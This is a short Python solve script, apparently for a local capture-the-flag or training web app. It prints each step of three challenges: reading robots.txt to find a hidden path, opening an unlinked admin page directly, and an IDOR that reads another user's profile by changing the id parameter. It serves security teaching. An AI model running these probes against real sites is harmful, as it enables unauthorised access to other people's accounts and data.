"""
solve.py — walks through solving all three challenges against the
running app, the same way a player/pentester would, and prints what
was found at each step.
"""
import requests

BASE = "http://127.0.0.1:5050"


def challenge_1_disclosure():
    print("=== Challenge 1: robots.txt discloses a hidden path ===")
    r = requests.get(f"{BASE}/robots.txt")
    print("robots.txt contents:")
    print(r.text)
    hidden_path = r.text.split("Disallow: ")[1].strip()
    print(f"Found disallowed path: {hidden_path}")
    return hidden_path


def challenge_2_broken_access_control(hidden_path):
    print("\n=== Challenge 2: visiting the unlinked admin page directly ===")
    r = requests.get(f"{BASE}{hidden_path}")
    print(r.text.strip())


def challenge_3_idor():
    print("\n=== Challenge 3: IDOR by changing the profile id ===")
    r1 = requests.get(f"{BASE}/profile?id=1")
    print("id=1 (our own profile):")
    print(r1.text.strip(), "\n")

    r2 = requests.get(f"{BASE}/profile?id=2")
    print("id=2 (someone else's profile — should not be accessible without auth):")
    print(r2.text.strip())


if __name__ == "__main__":
    hidden_path = challenge_1_disclosure()
    challenge_2_broken_access_control(hidden_path)
    challenge_3_idor()
